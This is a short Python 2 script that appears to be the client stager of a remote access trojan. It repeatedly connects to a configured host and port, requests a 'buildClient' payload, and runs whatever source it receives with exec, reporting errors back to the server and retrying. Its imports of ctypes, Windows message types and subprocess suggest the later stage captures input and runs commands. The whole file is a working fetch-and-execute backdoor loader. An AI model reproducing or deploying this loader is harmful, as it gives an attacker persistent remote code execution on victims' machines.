# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import ast
import sys
import os
import platform
import ctypes
from ctypes.wintypes import MSG
import threading
import subprocess
import sched
import datetime
import zlib

HOST = '127.0.0.1'
PORT = 4434

while 1:
    init_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        init_client.connect((HOST, PORT))
        init_client.recv(1024)
        init_client.sendall(str({'mode': 'buildClient', 'from': 'client', 'payload': '', 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
        received_data = ''
        payload = init_client.recv(1024)
        while payload:
            received_data = received_data + payload
            if received_data.endswith('[ENDOFSOURCE]'):
                received_data = received_data[:-len('[ENDOFSOURCE]')]
                break
            else:
                payload = init_client.recv(1024)
                continue
        try:
            exec received_data
        except Exception as e:
            init_client.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
            time.sleep(60)
    except socket.error:
        print 'error'
        time.sleep(5)